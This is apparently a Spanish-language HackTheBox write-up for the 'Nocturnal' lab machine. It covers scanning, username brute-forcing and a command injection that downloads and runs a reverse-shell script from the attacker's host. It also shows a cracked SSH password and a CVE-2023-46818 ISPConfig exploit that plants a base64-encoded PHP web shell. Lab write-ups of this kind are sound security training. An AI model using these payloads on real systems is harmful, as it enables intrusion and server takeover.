---
title: "Nocturnal"
date: 2026-09-19 14:17:31 +0200
categories: writeups HackTheBox
tags: máquina linux fuerzabruta cve infoleak criptografía ispconfig commandinjection
description: Writeup de la máquina Nocturnal de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

Texto

___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125324.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.129.206.47`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.129.206.47 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125512.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.129.206.47 -oN targeted
```

En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es la existencia del dominio **noctural.htb**.

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125528.png>)

___
### Puerto 80 - HTTP (Nginx)

**Virtual Hosting** `/etc/hosts` `nocturnal.htb 10.129.204.47`

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125734.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125905.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414125937.png>)

>[!INFO]
>No es posible aplicar ningún tipo de bypass ni nada del estilo

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414130131.png>)

```bash
http://nocturnal.htb/view.php?username=usuarionoexiste&file=noexiste.pdf
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414130304.png>)

```bash
http://nocturnal.htb/view.php?username=test&file=noexiste.pdf
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414130312.png>)

```bash
http://nocturnal.htb/view.php?username=admin&file=noexiste.pdf
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414130327.png>)

___
## Explotación
### Username Enumeration | Brute-Force Attack

**Wfuzz**

```bash
wfuzz -c -u "http://nocturnal.htb/view.php?username=FUZZ&file=noexiste.pdf" -w /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -H 'Cookie: PHPSESSID=<value>' --hh 2985
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414184039.png>)

```bash
http://nocturnal.htb/view.php?username=amanda&file=noexiste.pdf
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414131010.png>)
### Information Leakage \[Unintended Way]

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414131038.png>)

```bash
unzip privacy.odt
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414133532.png>)

### Downloading Backup

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414133709.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414133722.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414133856.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414133911.png>)
### Command Injection \[Intended Way]

[Command Injection Bypass - HackTricks](https://book.hacktricks.wiki/es/pentesting-web/command-injection.html#referencias)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502124641.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502124605.png>)

```python
password=%0Als&backup
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502124851.png>)

```python
password=%0Aw&backup
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502125013.png>)

```python
password=%0Acurl%0910.10.14.161/curlfunciona&backup=
```

Veremos que hemos conseguido tener ejecución remota de comandos (**RCE**), por lo que en este punto nos pondremos en escucha con **NetCat** (`nc -nlvp 443`) y nos enviaremos una **Reverse Shell**.

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502125135.png>)

```python
password=%0Acurl%0910.10.14.161/index.html%09/tmp/rev.sh&backup=
password=%0Achmod%09777%09/tmp/rev.sh&backup=
password=%0A/tmp/rev.sh&backup=
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502130123.png>)
___
## Movimiento lateral de usuario
### Enumeración local

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250502130743.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134135.png>)
### Cracking Hash

[Crackstation](crackstation.net) o [Hashes](hashes.com)

**tobias:slowmotionapocalypse**

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134235.png>)

> [!INFO]
> **hashcat** o **johntheripper**
![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134253.png>)

```bash
ssh tobias@nocturnal.htb # Password: slowmotionapocalypse
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134425.png>)

___
## Escalada de privilegios
### Enumeración local

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134541.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414135256.png>)

```bash
cat /proc/1004/cmdline | tr '\0' ' '; echo
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414135431.png>)

### Abuso de servicios internos del sis | Puerto 8080 (ISPConfig)

**Local Port Forwarding**

```bash
ssh tobias@10.129.53.253 -L 8081:localhost:8080
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414134814.png>)
#### CVE-2023-46818 | PHP Code Injection (ISPConfig ≤ 3.2.11)

[CVE-2023-46818 - PHP Code Injection](https://karmainsecurity.com/pocs/CVE-2023-46818.php)
#### Manual

```bash
curl -sX POST "http://localhost:8081/admin/language_edit.php" -d "lang=en&module=help&lang_file=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c 8 && echo -n ".lng")" -H 'Cookie: ISPCSESS=<your-cookie>' | grep -oP 'value="\K([A-Za-z]+\.lng)|name="_csrf_id" value="\K(language_edit_[a-z0-9]+)|name="_csrf_key" value="\K([a-z0-9]+)'
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414180436.png>)

```bash
curl -sk 'http://localhost:8081/admin/language_edit.php' -X 'POST' -H 'Cookie: ISPCSESS=<your-cookie>' --data-binary $'lang=en&module=help&lang_file=<file-lng>&_csrf_id=<your-csrf_id>&_csrf_key=<your-csrf_key>&records[\\]="\'];file_put_contents(\'cmd.php\',base64_decode(\'PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=\'));die;#'
```

```bash
curl -X GET "http://localhost:8081/admin/cmd.php?0=whoami;%20hostname%20-I" -H 'Cookie: ISPCSESS=k4e5afosv2jjc07csigpjdnti8'
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414183115.png>)
#### Automated

_Link repositorio Github Mio_ -> He perdido el exploit.py debido al apagón por lo que no hay exploit

```bash
python3 exploit.py -t http://localhost:8081 -i 10.10.14.196 -u admin -p slowmotionapocalypse
```

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414173119.png>)

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414141102.png>)

**Reverse Shell** **NetCat** (`nc -nlvp 443`)

**Tratamiento de la TTY**

![](<../assets/images/posts/2026-09-19-nocturnal/Pasted image 20250414141231.png>)